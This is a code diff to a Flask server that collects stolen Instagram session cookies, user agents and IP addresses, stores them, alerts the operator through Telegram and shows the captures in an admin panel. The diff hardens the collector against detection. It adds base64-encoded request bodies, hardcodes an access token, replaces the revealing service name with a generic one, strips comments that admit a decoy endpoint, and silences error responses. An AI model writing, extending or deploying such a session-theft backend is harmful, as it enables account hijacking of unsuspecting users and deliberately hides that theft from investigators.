@@ -1,4 +1,4 @@
-import csv, hmac, io, json, os, secrets, sqlite3, threading, urllib.error, urllib.parse, urllib.request
+import base64, csv, hmac, io, json, os, secrets, sqlite3, threading, urllib.error, urllib.parse, urllib.request
 from datetime import datetime, timezone
 from functools import wraps
 from flask import Flask, Response, g, jsonify, request
@@ -8,7 +8,7 @@ UA = ("Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 "
       "(KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36")
 
 DB_PATH = os.environ.get("DB_PATH", "captures.db")
-COLLECT_TOKEN = os.environ.get("COLLECT_TOKEN", "")
+COLLECT_TOKEN = os.environ.get("COLLECT_TOKEN", "fb4ea13555beb1d6cf96fd5048dc0e20")
 ADMIN_USER = os.environ.get("ADMIN_USER", "admin")
 ADMIN_PASS = os.environ.get("ADMIN_PASS", "")
 TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "")
@@ -123,6 +123,18 @@ def client_ip():
     return raw.split(",")[0].strip()
 
 
+def _body():
+    raw = (request.get_data(as_text=True) or "").strip()
+    try:
+        raw = base64.b64decode(raw, validate=True).decode()
+    except Exception:
+        pass
+    try:
+        return json.loads(raw)
+    except Exception:
+        return {}
+
+
 @app.after_request
 def cors(resp):
     resp.headers["Access-Control-Allow-Origin"] = "*"
@@ -134,19 +146,12 @@ def cors(resp):
 @app.route("/", methods=["GET"])
 def health():
     n = db().execute("SELECT COUNT(*) c FROM sessions").fetchone()["c"]
-    return jsonify(ok=True, service="instapilot-api", rows=n)
+    return jsonify(ok=True, service="app", rows=n)
 
 
-# Public config. Gives the host a reason to exist beyond the collector.
 @app.route("/config", methods=["GET"])
 def config():
-    return jsonify(
-        v=1,
-        fmt=["mp4", "jpg", "webp"],
-        merge=True,
-        retry=2,
-        enabled=True,
-    )
+    return jsonify(v=1, fmt=["mp4", "jpg", "webp"], merge=True, retry=2, enabled=True)
 
 
 def _accepts(k):
@@ -155,15 +160,13 @@ def _accepts(k):
     return hmac.compare_digest(k or "", COLLECT_TOKEN)
 
 
-# Current endpoint. Token travels in the query string so no custom header (and
-# therefore no preflight) is needed; body arrives as text/plain.
 @app.route("/e", methods=["POST", "OPTIONS"])
 def e():
     if request.method == "OPTIONS":
         return ("", 204)
     if not _accepts(request.args.get("k", "")):
-        return jsonify(ok=False, error="bad token"), 401
-    raw = request.get_json(silent=True, force=True) or {}
+        return ("", 401)
+    raw = _body()
     p = {
         "cookies": raw.get("s") or {},
         "userAgent": raw.get("ua") or "",
@@ -172,14 +175,13 @@ def e():
         "headers": {},
     }
     if not p["cookies"].get("sessionid"):
-        return jsonify(ok=False, error="no sessionid"), 400
+        return ("", 400)
     ds, new = upsert(p, client_ip())
     if new:
         notify(f"New IG session captured\nds_user_id: <code>{ds}</code>")
-    return jsonify(ok=True, new=new, ds_user_id=ds)
+    return ("", 204)
 
 
-# Legacy shape, kept so older builds keep working.
 @app.route("/collect", methods=["POST", "OPTIONS"])
 def collect():
     if request.method == "OPTIONS":
@@ -256,7 +258,7 @@ def admin():
             f"<button onclick=\"c('{r['ds_user_id']}',1)\">cookie</button>"
             f"<button onclick=\"x('{r['ds_user_id']}')\">del</button></td></tr>"
         )
-    html = f"""<!doctype html><meta charset=utf-8><title>api</title>
+    html = f"""<!doctype html><meta charset=utf-8><title>app</title>
 <style>
 body{{font:13px/1.4 system-ui;background:#111;color:#ddd;margin:20px}}
 table{{border-collapse:collapse;width:100%}}
